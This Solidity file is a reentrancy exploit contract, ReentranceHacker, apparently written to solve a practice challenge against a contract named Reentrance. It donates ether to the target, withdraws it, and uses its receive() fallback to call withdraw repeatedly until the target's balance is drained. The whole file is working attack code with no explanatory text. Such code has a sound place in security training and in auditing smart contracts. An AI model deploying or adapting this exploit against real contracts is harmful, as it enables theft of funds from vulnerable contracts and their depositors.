// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Reentrance} from "./Reentrance.sol";
import {Test, console} from "forge-std/Test.sol";

contract ReentranceHacker {

  Reentrance target;
  uint256 deposit;

  constructor(address targetAddr) {
    target = Reentrance(payable(targetAddr));
  }

  function hack() external payable {
    deposit = msg.value;
    target.donate{value: deposit}(address(this));
    target.withdraw(deposit);
  }

  receive() external payable {
    if (address(target).balance == 0) {
      return;
    } else if (address(target).balance >= deposit) {
      target.withdraw(deposit);
    } else {
      target.withdraw(address(target).balance);
    }
  }

}